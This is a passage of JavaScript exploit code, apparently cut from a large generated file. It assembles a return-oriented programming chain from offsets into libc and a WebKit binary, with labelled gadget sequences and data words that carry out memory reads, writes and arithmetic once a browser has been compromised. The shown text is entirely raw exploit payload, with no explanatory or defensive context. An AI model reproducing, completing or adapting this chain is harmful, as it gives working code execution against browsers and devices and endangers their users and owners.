ropchain+1072464, //L592
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1072480, //L593
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L592:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L593:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L594:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1072568, //L596
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1072624, //L597
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L597:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1072704, //L599
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L599:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L600:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L601:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1072816, //L602
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1072832, //L603
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L602:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1072920, //L605
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1072976, //L606
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L606:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1073048, //L609
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L609:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1073104, //L610
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L610:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1073208, //L613
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L612:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L613:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1073296, //L615
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1073312, //L616
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L615:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L616:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1073456, //L620
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1073424, //L618
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1073440, //L619
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L618:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L619:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L620:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1073528, //L622
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L622:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1073584, //L623
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L623:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1073664, //L625
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L625:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L626:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L627:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1073776, //L628
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1073792, //L629
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L628:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1073880, //L631
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L631:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1073936, //L632
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L632:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1074056, //L635
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L634:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L635:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1074144, //L637
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1074160, //L638
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L637:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L638:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1074304, //L642
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1074272, //L640
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1074288, //L641
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L640:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L641:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L642:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1074376, //L644
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L644:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1074432, //L645
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L645:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1074512, //L647
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L647:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L648:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L649:
db([7, 0]); // 0x7
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1074624, //L650
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1074640, //L651
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L650:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1074728, //L653
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L653:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1074784, //L654
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L654:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1074856, //L657
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L657:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1074912, //L658
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L658:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1075016, //L661
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L660:
db([40, 0]); // 0x28
set_gadget(libc_base+763368,); //pop rcx
//L661:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1075104, //L663
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1075120, //L664
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L663:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1075264, //L668
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1075232, //L666
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1075248, //L667
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L666:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L667:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L668:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1075360, //L670
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L669:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L670:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1075448, //L672
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1075464, //L673
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L672:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L673:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1075608, //L677
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1075576, //L675
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1075592, //L676
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L675:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L676:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L677:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1075680, //L679
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L679:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1075736, //L680
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L680:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1075816, //L682
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L682:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L683:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L684:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1075928, //L685
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1075944, //L686
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L685:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1076032, //L688
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L688:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1076088, //L689
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L689:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1076160, //L692
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L692:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1076216, //L693
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L693:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L695:
libc_base+755774, //mov rax, rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1076368, //L697
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L696:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L697:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1076456, //L699
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1076472, //L700
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L699:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L700:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1076616, //L704
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1076584, //L702
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1076600, //L703
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L702:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L703:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L704:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1076688, //L706
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1076744, //L707
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L707:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1076824, //L709
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L709:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L710:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L711:
db([9, 0]); // 0x9
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1076936, //L712
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1076952, //L713
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L712:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L713:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1077040, //L715
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L715:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1077096, //L716
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L716:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1077168, //L719
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L719:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1077224, //L720
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L720:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L722:
libc_base+764760, //pop rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1077376, //L724
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L723:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L724:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1077464, //L726
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1077480, //L727
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L726:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L727:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1077624, //L731
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1077592, //L729
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1077608, //L730
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L729:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L730:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L731:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1077696, //L733
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L733:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1077752, //L734
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L734:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1077832, //L736
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L736:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L737:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L738:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1077944, //L739
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1077960, //L740
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L739:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L740:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1078048, //L742
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L742:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1078104, //L743
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L743:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1078176, //L746
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L746:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1078232, //L747
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L747:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1078336, //L750
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L749:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L750:
